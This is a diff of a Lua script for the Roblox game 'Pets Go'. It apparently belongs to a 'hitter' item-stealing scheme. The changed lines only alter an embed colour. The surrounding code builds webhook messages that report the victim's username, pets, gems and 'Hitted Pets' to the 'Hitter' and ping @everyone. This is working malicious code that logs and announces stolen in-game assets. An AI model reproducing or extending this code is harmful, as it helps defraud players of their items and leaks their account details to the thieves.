@@ -77,7 +77,7 @@ end
 end)
 if dh then
 _G.dx=true
-msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":65512}],"tts":false,"content":"@everyone"}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone"}'
 else
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"@everyone"}'
 end
@@ -98,7 +98,7 @@ if not _G.User then _G.User="yve (pet change hit)" end
 print(#big)
 local log = ""
 if dh then
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":65512}],"tts":false,"content":"@everyone '..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone '..xxxvvv..'"}'
 else
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"```\\n'..pn..'```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n'..gn..'```","name":"⮚ Gems ⮘","inline":false},{"value":"```diff\\n'..big..'```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
 end
